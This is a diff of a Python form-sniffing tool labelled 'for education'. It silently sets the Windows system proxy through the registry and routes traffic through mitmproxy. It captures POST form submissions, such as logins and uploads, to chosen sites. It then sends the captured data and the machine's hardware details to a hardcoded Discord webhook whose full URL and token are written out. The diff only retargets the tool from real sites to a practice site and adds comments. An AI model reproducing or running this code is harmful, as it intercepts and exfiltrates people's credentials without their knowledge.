@@ -1,18 +1,22 @@
-import asyncio, requests, json, winreg, platform, psutil, GPUtil, cpuinfo, uuid, wmi
+import asyncio, requests, json, winreg, platform, GPUtil, cpuinfo, uuid, wmi
 from mitmproxy import options, http
 from mitmproxy.tools import dump
 from rich.console import Console
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
 console = Console(width=100)
-console.print(f"[bold dark_orange]THT FORM SNIFFER (FOR EDUCATION)[/bold dark_orange]", no_wrap=True)
+console.print(f"[bold dark_orange]THT FORM SNIFFER (EĞİTİM AMAÇLIDIR / FOR EDUCATION)[/bold dark_orange]", no_wrap=True)
 
+# SECTION Kodun çalışması için genel ayarlar.
 LISTEN_HOST = "127.0.0.1"
 LISTEN_PORT = 1881
 NET_DUMP_LOG = False
-WEBHOOK_URL = "https://discord.com/api/webhooks/1262161347706355792/gcfFikUUJEj8Q-zkuIOf4D44eDd1isiOaWLMYnouf1WbMtKA38nyv3z4tSqCM88HX4y5"
-SNIFFED_ADRESSES = ["https://midnight.im", "https://hizliresim.com/"]
+START_PROXY_WHEN_OPENING = True
+WEBHOOK_URL = "https://discord.com/api/webhooks/1262161347706355792/gcfFikUUJEj8Q-zkuIOf4D44eDd1isiOaWLMYnouf1WbMtKA38nyv3z4tSqCM88HX4y5" # NOTE Bu webhook discord üzerinden silinmiştir örnek olarak koyulmuştur.
+SNIFFED_ADRESSES = ["https://practice.expandtesting.com/authenticate", "https://practice.expandtesting.com/upload"]
+# !SECTION
 
+# SECTION Proxy ayarlarını bu iki fonksiyon yapılandırır.
 def set_proxy_settings():
     try:
         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -36,7 +40,9 @@ def disable_proxy_settings():
         winreg.CloseKey(registry_key)
     except Exception as e:
         print("Proxy ayarları kaldırılırken bir hata meydana geldi:", e)
+# !SECTION
 
+# SECTION Yazılım çalıştığı cihazın bilgilerini çeker.
 def get_system_info():
     cpu_info = cpuinfo.get_cpu_info()
     c = wmi.WMI()
@@ -68,12 +74,18 @@ def get_system_info():
         system_info["gpus"].append(gpu_info)
     
     return system_info
+# !SECTION
 
-set_proxy_settings()
+# SECTION Yazılım açıldığında otomatik olarak sistem proxysini ayarlar.
+# NOTE İsteğe bağlı genel ayarlardan kapatılabilir.
+if START_PROXY_WHEN_OPENING:
+    set_proxy_settings()
+# !SECTION
 
+# SECTION Yazılım ana kod parçacığı.
 class RequestLogger:
     async def request(self, flow: http.HTTPFlow):
-        if str(flow.request.method) == "POST" and flow.request.headers.get("origin") in SNIFFED_ADRESSES:
+        if str(flow.request.method) == "POST" and flow.request.url in SNIFFED_ADRESSES:
             try:
                 disable_proxy_settings()
                 get_content_type = flow.request.headers.get("content-type")
@@ -116,8 +128,9 @@ class RequestLogger:
                 set_proxy_settings()
             except Exception as e:
                 console.print(e, no_wrap=True)
+# !SECTION
 
-
+# SECTION Yazılımın asenkron çalışması için gereken kısımlar.
 async def start_proxy(host, port):
     opts = options.Options(listen_host=host, listen_port=port)
     master = dump.DumpMaster(
@@ -146,3 +159,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+# !SECTION
